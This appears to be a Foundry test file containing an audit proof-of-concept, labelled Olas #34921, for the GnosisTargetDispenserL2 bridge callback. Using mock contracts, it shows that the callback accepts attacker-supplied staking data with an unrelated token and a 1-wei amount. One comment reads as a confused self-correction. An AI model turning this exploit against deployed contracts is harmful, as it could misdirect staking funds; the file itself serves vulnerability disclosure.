// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "../src/tokenomics/contracts/staking/GnosisTargetDispenserL2.sol";

contract OlasMockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
}

contract OlasMockFactory {
    uint256 public limit;
    function setLimit(uint256 value) external { limit = value; }
    function verifyInstanceAndGetEmissionsAmount(address) external view returns (uint256) { return limit; }
}

contract OlasMockStaking {
    uint256 public deposited;
    function deposit(uint256 amount) external { deposited += amount; }
}

/// Reproduces Code4rena LoopFi? No: this is Olas #34921 against the audited
/// GnosisTargetDispenserL2 callback at commit 3ce502e.
contract PoC_34921 is Test {
    GnosisTargetDispenserL2 internal dispenser;
    OlasMockToken internal olas;
    OlasMockFactory internal factory;
    OlasMockStaking internal target;
    address internal l2MessageRelayer = address(0xBEEF);
    address internal l1Processor = address(0xCAFE);
    address internal tokenRelayer = address(0xD00D);

    function setUp() public {
        olas = new OlasMockToken();
        factory = new OlasMockFactory();
        target = new OlasMockStaking();
        dispenser = new GnosisTargetDispenserL2(
            address(olas), address(factory), l2MessageRelayer, l1Processor, 1, tokenRelayer
        );
        olas.mint(address(dispenser), 100 ether);
        factory.setLimit(100 ether);
    }

    function testUnverifiedTokenCallbackProcessesAttackerData() public {
        address[] memory targets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        targets[0] = address(target);
        amounts[0] = 10 ether;
        bytes memory maliciousData = abi.encode(targets, amounts);

        // The callback checks only msg.sender == l2TokenRelayer. The token
        // address and bridged amount parameters are ignored, so an attacker
        // can relay arbitrary staking data with an unrelated token.
        vm.prank(tokenRelayer);
        dispenser.onTokenBridged(address(0x123456), 1 wei, maliciousData);

        assertEq(target.deposited(), 10 ether);
        assertEq(dispenser.stakingBatchNonce(), 1);
        assertEq(dispenser.withheldAmount(), 0);
    }
}
